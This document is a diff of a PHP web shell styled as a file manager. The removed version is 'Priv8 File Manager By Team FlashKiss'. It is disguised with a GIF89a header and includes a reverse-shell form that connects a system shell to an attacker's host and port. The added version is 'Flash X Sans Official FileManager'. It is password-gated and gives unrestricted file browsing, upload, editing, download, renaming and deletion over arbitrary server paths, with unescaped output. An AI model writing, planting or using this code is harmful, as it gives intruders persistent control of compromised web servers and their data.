@@ -1,451 +1,248 @@
-GIF89a
+<?php
+session_start();
+
+$stored_hash = '$2a$12$v3lJzpUuGah0DUXIf1CyXuh714d2sd0/ZljX3IzZuxlOCkp58GQ1q';
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+if (isset($_POST['password'])) {
+    if (password_verify($_POST['password'], $stored_hash)) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        $error = "Invalid password.";
+    }
+}
+
+if (!isset($_SESSION['authenticated'])):
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - TripleDNN</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: linear-gradient(145deg, #0f0f0f, #1f1f1f);
+            color: #eee;
+            font-family: 'Segoe UI', sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            background: rgba(30, 30, 30, 0.95);
+            padding: 50px;
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.9);
+            width: 400px;
+            text-align: center;
+            animation: fadeIn 0.8s ease-in-out;
+        }
+        .login-container h2 {
+            margin-bottom: 30px;
+            color: #BB86FC;
+            font-size: 28px;
+        }
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin: 20px 0;
+            background: #222;
+            border: 1px solid #555;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(to right, #03dac6, #bb86fc);
+            color: #121212;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease-in-out;
+        }
+        .login-container button:hover {
+            background: linear-gradient(to right, #bb86fc, #03dac6);
+            transform: scale(1.05);
+        }
+        .error {
+            color: #f55;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <form method="post" class="login-container">
+        <h2>🔒 Flash X Sans Official FileManager</h2>
+        <?php if (isset($error)): ?><p class="error"><?= $error ?></p><?php endif; ?>
+        <input type="password" name="password" placeholder="Enter secure password" required>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
+<?php exit; endif; ?>
 
 <?php
-/* GIF89a */
+$root_dir = realpath(__DIR__);
+$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;
+if (!$current_dir || !is_dir($current_dir)) {
+    $current_dir = $root_dir;
+}
 
-$home = $_SERVER['HOME'] ?? '/';
-$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
-if (!$path || !is_dir($path)) $path = getcwd();
-$uploadSuccess = false;
-$fileLink = '';
-$currentYear = date("Y");
-$editContent = '';
-$editTarget = '';
+function listDirectory($dir) {
+    $files = scandir($dir);
+    $directories = [];
+    $regular_files = [];
 
-function h($str) { return htmlspecialchars($str, ENT_QUOTES); }
-
-// Handle Upload
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    if (isset($_FILES['upload'])) {
-        $dest = $path . '/' . basename($_FILES['upload']['name']);
-        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
-            $uploadSuccess = true;
-            $fileLink = basename($dest);
+    foreach ($files as $file) {
+        if ($file != "." && $file != "..") {
+            if (is_dir($dir . '/' . $file)) {
+                $directories[] = $file;
+            } else {
+                $regular_files[] = $file;
+            }
         }
-    } elseif (isset($_POST['chmod'], $_POST['file'])) {
-        chmod($path . '/' . $_POST['file'], intval($_POST['chmod'], 8));
-    } elseif (isset($_POST['savefile'], $_POST['filename'])) {
-        file_put_contents($path . '/' . $_POST['filename'], $_POST['savefile']);
-    } elseif (isset($_POST['rename'], $_POST['oldname'])) {
-        rename($path . '/' . $_POST['oldname'], $path . '/' . $_POST['rename']);
-    } elseif (isset($_POST['reverse_host'], $_POST['reverse_port'])) {
-        // Reverse shell handler
-        $host = $_POST['reverse_host'];
-        $port = (int)$_POST['reverse_port'];
-        $shell = isset($_POST['reverse_shell']) ? $_POST['reverse_shell'] : '/bin/sh';
-        
-        // Execute reverse shell in background
-        $cmd = "php -r '\$s=fsockopen(\"$host\",$port);"
-              . "system(\"$shell <&3 >&3 2>&3\");' > /dev/null 2>&1 &";
-        exec($cmd);
+    }
+
+    foreach ($directories as $directory) {
+        echo '<tr><td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">📁 ' . $directory . '</a></td><td>Folder</td><td><a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> | <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> | <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> | <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a></td></tr>';
+    }
+
+    foreach ($regular_files as $file) {
+        echo '<tr><td>' . $file . '</td><td>' . filesize($dir . '/' . $file) . ' bytes</td><td><a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> | <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> | <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> | <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a></td></tr>';
     }
 }
 
-// Handle Edit
-if (isset($_GET['edit'])) {
-    $editTarget = basename($_GET['edit']);
-    $editPath = $path . '/' . $editTarget;
-    if (is_file($editPath)) {
-        $editContent = htmlspecialchars(file_get_contents($editPath));
-    }
-}
-
-// Handle Delete
 if (isset($_GET['delete'])) {
-    $target = $path . '/' . basename($_GET['delete']);
-    if (is_file($target)) {
-        unlink($target);
-        header("Location: ?path=" . urlencode($path));
+    $file_to_delete = $current_dir . '/' . $_GET['delete'];
+    if (is_file($file_to_delete)) {
+        unlink($file_to_delete);
+    }
+    header("Location: ?dir=" . urlencode($_GET['dir']));
+}
+
+if (isset($_GET['download'])) {
+    $file_to_download = $current_dir . '/' . $_GET['download'];
+    if (is_file($file_to_download)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
+        header('Content-Length: ' . filesize($file_to_download));
+        readfile($file_to_download);
         exit;
     }
+}
+
+if (isset($_POST['rename_file'])) {
+    $old_name = $current_dir . '/' . $_POST['old_name'];
+    $new_name = $current_dir . '/' . $_POST['new_name'];
+    rename($old_name, $new_name);
+    header("Location: ?dir=" . urlencode($_GET['dir']));
+}
+
+if (isset($_POST['upload'])) {
+    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
+    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
+    header("Location: ?dir=" . urlencode($_GET['dir']));
+}
+
+if (isset($_POST['save_file'])) {
+    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
+    $new_content = $_POST['file_content'];
+    file_put_contents($file_to_edit, $new_content);
+    header("Location: ?dir=" . urlencode($_GET['dir']));
+}
+
+if (isset($_POST['create_file'])) {
+    $new_file_name = $_POST['new_file_name'];
+    $new_file_path = $current_dir . '/' . $new_file_name;
+    file_put_contents($new_file_path, "");
+    header("Location: ?dir=" . urlencode($_GET['dir']));
 }
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Priv8 File Manager By Team FlashKiss</title>
+    <title>Flash X Sans Official FileManager</title>
     <style>
-        /* Comic Sans MS Font Family */
-        body, input, button, textarea, select, table, h1, h2, h3, h4, h5, h6 {
-            font-family: 'Comic Sans MS', 'Comic Sans', cursive, sans-serif;
-        }
-        
-        body { 
-            background: #0a0f1a; 
-            color: #f0f8ff; 
-            padding: 20px;
-            background-image: radial-gradient(circle at 10% 20%, #1a2a6c 0%, #0a0f1a 90%);
-        }
-        a { 
-            color: #ff6ec7; 
-            text-decoration: none; 
-            transition: all 0.3s;
-        }
-        a:hover { 
-            color: #ff9ad5; 
-            text-decoration: underline; 
-            text-shadow: 0 0 5px rgba(255, 110, 199, 0.5);
-        }
-        table { 
-            width: 100%; 
-            border-collapse: collapse; 
-            margin-top: 15px; 
-            background: rgba(16, 22, 40, 0.8); 
-            border: 1px solid #334155;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
-        }
-        th, td { 
-            padding: 10px 15px; 
-            border: 1px solid #2d3b55; 
-            text-align: left; 
-        }
-        th { 
-            background: rgba(42, 67, 101, 0.8); 
-            color: #e0f7fa; 
-            text-shadow: 0 1px 1px #000;
-        }
-        tr:nth-child(even) { 
-            background: rgba(20, 30, 48, 0.6); 
-        }
-        tr:hover {
-            background: rgba(50, 80, 120, 0.4);
-        }
-        input, button, textarea, select {
-            background: rgba(16, 22, 40, 0.8); 
-            color: #f0f8ff; 
-            border: 1px solid #445577; 
-            padding: 8px 15px;
-            border-radius: 6px; 
-            margin: 6px 0;
-            font-size: 15px;
-            transition: all 0.3s;
-        }
-        input:focus, textarea:focus, select:focus {
-            border-color: #ff6ec7;
-            box-shadow: 0 0 8px rgba(255, 110, 199, 0.4);
-            outline: none;
-        }
-        button { 
-            background: linear-gradient(to bottom, #ff6ec7, #d741a7); 
-            color: #fff; 
-            font-weight: bold; 
-            cursor: pointer; 
-            border: none;
-            text-shadow: 0 1px 1px rgba(0,0,0,0.4);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
-        }
-        button:hover { 
-            background: linear-gradient(to bottom, #ff9ad5, #ff6ec7); 
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0,0,0,0.4);
-        }
-        .breadcrumb a { 
-            color: #a0d2eb; 
-            margin-right: 3px; 
-        }
-        .breadcrumb span { 
-            color: #5d7a9c; 
-            margin: 0 4px; 
-        }
-        .card { 
-            background: rgba(16, 22, 40, 0.8); 
-            padding: 20px; 
-            border-radius: 10px; 
-            border: 1px solid #334155;
-            margin-top: 20px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(4px);
-        }
-        textarea { 
-            width: 100%; 
-            height: 300px; 
-            margin-top: 10px; 
-        }
-        footer { 
-            text-align: center; 
-            margin-top: 40px; 
-            color: #5d7a9c; 
-            font-size: 0.9em; 
-            text-shadow: 0 1px 1px #000;
-        }
-        h2 { 
-            color: #ff6ec7; 
-            border-bottom: 2px solid #445577; 
-            padding-bottom: 12px; 
-            text-shadow: 0 2px 3px rgba(0,0,0,0.5);
-            font-size: 28px;
-        }
-        .success { 
-            color: #7fffd4; 
-            background: rgba(0, 100, 80, 0.3); 
-            padding: 12px; 
-            border-radius: 6px; 
-            border: 1px solid #00cc99;
-            margin-top: 15px;
-        }
-        .form-row { 
-            margin-bottom: 15px; 
-        }
-        .form-row label { 
-            display: block; 
-            margin-bottom: 8px; 
-            color: #a0d2eb; 
-            font-weight: bold;
-        }
-        .reverse-shell { 
-            border-left: 4px solid #ff6ec7; 
-        }
-        .dir-item { 
-            font-weight: bold; 
-            color: #ffb6c1; 
-        }
-        .file-item { 
-            color: #e0f7fa; 
-        }
-        .dir-item:before { 
-            content: "📂 "; 
-            color: #ff6ec7;
-        }
-        .actions { 
-            display: flex; 
-            gap: 8px; 
-            flex-wrap: wrap; 
-        }
-        .action-btn { 
-            background: rgba(42, 67, 101, 0.8); 
-            color: #e0f7fa; 
-            border: 1px solid #445577; 
-            padding: 5px 12px; 
-            border-radius: 5px; 
-            font-size: 14px; 
-            text-decoration: none; 
-            cursor: pointer;
-            transition: all 0.3s;
-            display: inline-flex;
-            align-items: center;
-        }
-        .action-btn:hover { 
-            background: rgba(60, 90, 140, 0.8); 
-            transform: translateY(-2px);
-            box-shadow: 0 3px 6px rgba(0,0,0,0.3);
-        }
-        .toggle-header { 
-            cursor: pointer; 
-            display: flex; 
-            justify-content: space-between;
-            align-items: center; 
-            padding: 12px 18px; 
-            background: rgba(42, 67, 101, 0.8);
-            border-radius: 8px; 
-            margin: -20px -20px 20px -20px;
-            border-bottom: 2px solid #445577;
-        }
-        .toggle-header h3 { 
-            margin: 0; 
-            color: #ffb6c1;
-            text-shadow: 0 1px 1px #000;
-        }
-        .toggle-icon { 
-            transition: transform 0.3s; 
-            color: #ff6ec7;
-            font-size: 20px;
-        }
-        .collapsed .toggle-icon { 
-            transform: rotate(180deg); 
-        }
-        .collapsed .toggle-content { 
-            display: none; 
-        }
-        .signature { 
-            position: fixed; 
-            bottom: 15px; 
-            right: 20px; 
-            font-size: 20px; 
-            color: #ff6ec7; 
-            opacity: 0.75;
-            font-weight: bold;
-            text-shadow: 0 0 10px rgba(255, 110, 199, 0.8);
-            transform: rotate(-5deg);
-            z-index: 1000;
-            transition: all 0.5s;
-        }
-        .signature:hover { 
-            opacity: 1;
-            transform: rotate(0deg) scale(1.1);
-            text-shadow: 0 0 20px rgba(255, 110, 199, 1);
-        }
-        .header-glow {
-            text-shadow: 0 0 10px rgba(255, 110, 199, 0.7);
-        }
+        body { background-color: #121212; color: #E0E0E0; font-family: Arial, sans-serif; }
+        h2 { color: #BB86FC; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 10px; text-align: left; }
+        th { background-color: #333; color: #BB86FC; }
+        tr:nth-child(even) { background-color: #222; }
+        tr:nth-child(odd) { background-color: #121212; }
+        a { color: #03DAC6; text-decoration: none; }
+        a:hover { color: #BB86FC; }
+        button { background-color: #03DAC6; color: #121212; border: none; padding: 10px 20px; cursor: pointer; }
+        button:hover { background-color: #BB86FC; }
+        textarea { width: 100%; height: 400px; background-color: #222; color: #E0E0E0; border: 1px solid #BB86FC; }
+        input[type="file"], input[type="text"] { color: #E0E0E0; background-color: #222; border: 1px solid #BB86FC; padding: 10px; }
+        .form-container { display: flex; justify-content: space-between; margin-bottom: 20px; }
+        .form-container form { margin-right: 10px; }
     </style>
-    <script>
-        function toggleCollapse(element) {
-            element.parentElement.classList.toggle('collapsed');
-        }
-    </script>
 </head>
 <body>
+    <p>Current Directory: <a href="?dir=<?= urlencode(dirname($current_dir)) ?>" style="color: #03DAC6;"><?= $current_dir ?></a> | <a href="?logout=1" style="float:right;color:#F55;">Logout</a></p>
 
-<h2 class="header-glow">File Manager</h2>
-
-<!-- Change Directory -->
-<form method="get">
-    <div class="form-row">
-        <label>Current Directory:</label>
-        <input type="text" name="path" value="<?= h($path) ?>" style="width:70%;">
-        <button type="submit">Go</button>
-    </div>
-</form>
-
-<!-- Breadcrumbs -->
-<div class="breadcrumb">
-    <?php
-    $crumbs = explode('/', trim($path, '/'));
-    $accum = '';
-    echo '<a href="?path=/">/</a>';
-    foreach ($crumbs as $crumb) {
-        $accum .= '/' . $crumb;
-        echo '<span>/</span><a href="?path=' . urlencode($accum) . '">' . h($crumb) . '</a>';
-    }
-    echo '<span>/</span><a href="?path=' . urlencode($home) . '">[ HOME ]</a>';
-    ?>
-</div>
-
-<!-- Parent Dir -->
-<?php if (dirname($path) !== $path): ?>
-<p><a href="?path=<?= urlencode(dirname($path)) ?>" class="action-btn">Parent Directory</a></p>
-<?php endif; ?>
-
-<!-- Upload -->
-<div class="card">
-    <form method="post" enctype="multipart/form-data">
-        <div class="form-row">
-            <label>Upload File:</label>
-            <input type="file" name="upload" required>
-            <button type="submit">Upload</button>
-        </div>
-    </form>
-    <?php if ($fileLink): ?>
-        <div class="success">File uploaded successfully: <a href="<?= h($fileLink) ?>" target="_blank"><?= h($fileLink) ?></a></div>
-    <?php endif; ?>
-</div>
-
-<!-- Reverse Shell - Collapsible Section -->
-<div class="card reverse-shell collapsed">
-    <div class="toggle-header" onclick="toggleCollapse(this)">
-        <h3>Reverse Shell Connection</h3>
-        <div class="toggle-icon">▼</div>
-    </div>
-    
-    <div class="toggle-content">
+    <div class="form-container">
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="file">
+            <button type="submit" name="upload">Upload</button>
+        </form>
         <form method="post">
-            <div class="form-row">
-                <label>Host:</label>
-                <input type="text" name="reverse_host" placeholder="attacker-ip" required>
-            </div>
-            
-            <div class="form-row">
-                <label>Port:</label>
-                <input type="number" name="reverse_port" placeholder="4444" required>
-            </div>
-            
-            <div class="form-row">
-                <label>Shell Type:</label>
-                <select name="reverse_shell">
-                    <option value="/bin/sh">/bin/sh</option>
-                    <option value="/bin/bash">/bin/bash</option>
-                    <option value="cmd.exe">cmd.exe (Windows)</option>
-                    <option value="powershell">PowerShell</option>
-                </select>
-            </div>
-            
-            <button type="submit">Connect Reverse Shell</button>
+            <input type="text" name="new_file_name" placeholder="New file name" required>
+            <button type="submit" name="create_file">Create File</button>
         </form>
     </div>
-</div>
 
-<!-- Edit File -->
-<?php if ($editTarget): ?>
-<div class="card">
-    <h3>Editing: <?= h($editTarget) ?></h3>
-    <form method="post">
-        <input type="hidden" name="filename" value="<?= h($editTarget) ?>">
-        <textarea name="savefile"><?= $editContent ?></textarea><br>
-        <button type="submit">Save Changes</button>
-    </form>
-</div>
-<?php endif; ?>
-
-<!-- File List -->
-<div class="card">
-    <table>
-        <tr>
-            <th>Name</th><th>Size (kB)</th><th>Modified</th><th>Perms</th><th>Actions</th>
-        </tr>
-        <?php
-        $items = scandir($path);
-        $dirs = $files = [];
-
-        foreach ($items as $item) {
-            if ($item === '.') continue;
-            if (is_dir($path . '/' . $item)) {
-                $dirs[] = $item;
-            } else {
-                $files[] = $item;
-            }
-        }
-
-        $all = array_merge($dirs, $files);
-
-        foreach ($all as $item) {
-            $full = $path . '/' . $item;
-            $isDir = is_dir($full);
-            $perm = substr(sprintf('%o', fileperms($full)), -4);
-            $mtime = filemtime($full);
-            $size = $isDir ? '-' : round(filesize($full) / 1024, 2);
-            $date = date("Y-m-d H:i", $mtime);
-
-            echo '<tr>';
-            echo '<td class="' . ($isDir ? 'dir-item' : 'file-item') . '">';
-            if ($isDir) {
-                echo '<a href="?path=' . urlencode($full) . '">' . h($item) . '</a>';
-            } else {
-                echo h($item);
-            }
-            echo '</td>';
-            echo "<td>$size</td><td>$date</td>";
-            echo '<td>
-                <form method="post" style="display:inline;">
-                    <input type="hidden" name="file" value="' . h($item) . '">
-                    <input type="text" name="chmod" value="' . $perm . '" size="4">
-                    <button>Set</button>
-                </form>
-            </td>';
-            echo '<td class="actions">';
-            if (!$isDir) {
-                echo '<a href="?path=' . urlencode($path) . '&edit=' . urlencode($item) . '" class="action-btn">Edit</a>';
-                echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($item) . '" onclick="return confirm(\'Delete this file?\')" class="action-btn">Delete</a>';
-                echo '<a href="' . h($item) . '" download class="action-btn">Download</a>';
-                echo '<form method="post" style="display:inline;">
-                        <input type="hidden" name="oldname" value="' . h($item) . '">
-                        <input type="text" name="rename" value="' . h($item) . '" size="12">
-                        <button class="action-btn">Rename</button>
-                    </form>';
-            } else {
-                echo '-';
-            }
-            echo '</td></tr>';
-        }
-        ?>
+    <table border="1">
+        <thead>
+            <tr><th>File Name</th><th>Size</th><th>Actions</th></tr>
+        </thead>
+        <tbody>
+            <?php listDirectory($current_dir); ?>
+        </tbody>
     </table>
-</div>
 
-<footer>
-    © <?= $currentYear ?> | Priv8 File Manager By Team FlashKiss
-</footer>
+    <?php if (isset($_GET['rename'])): ?>
+    <form method="post">
+        <input type="hidden" name="old_name" value="<?= $_GET['rename'] ?>">
+        <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;">
+        <button type="submit" name="rename_file">Rename</button>
+    </form>
+    <?php endif; ?>
 
-<div class="signature">FlashKiss</div>
-
+    <?php if (isset($_GET['edit'])):
+        $file_to_edit = $current_dir . '/' . $_GET['edit'];
+        if (is_file($file_to_edit)) {
+            $file_content = file_get_contents($file_to_edit);
+    ?>
+    <form method="post">
+        <input type="hidden" name="file_name" value="<?= $_GET['edit'] ?>">
+        <textarea name="file_content"><?= htmlspecialchars($file_content) ?></textarea><br>
+        <button type="submit" name="save_file">Save Changes</button>
+    </form>
+    <?php } endif; ?>
 </body>
 </html>
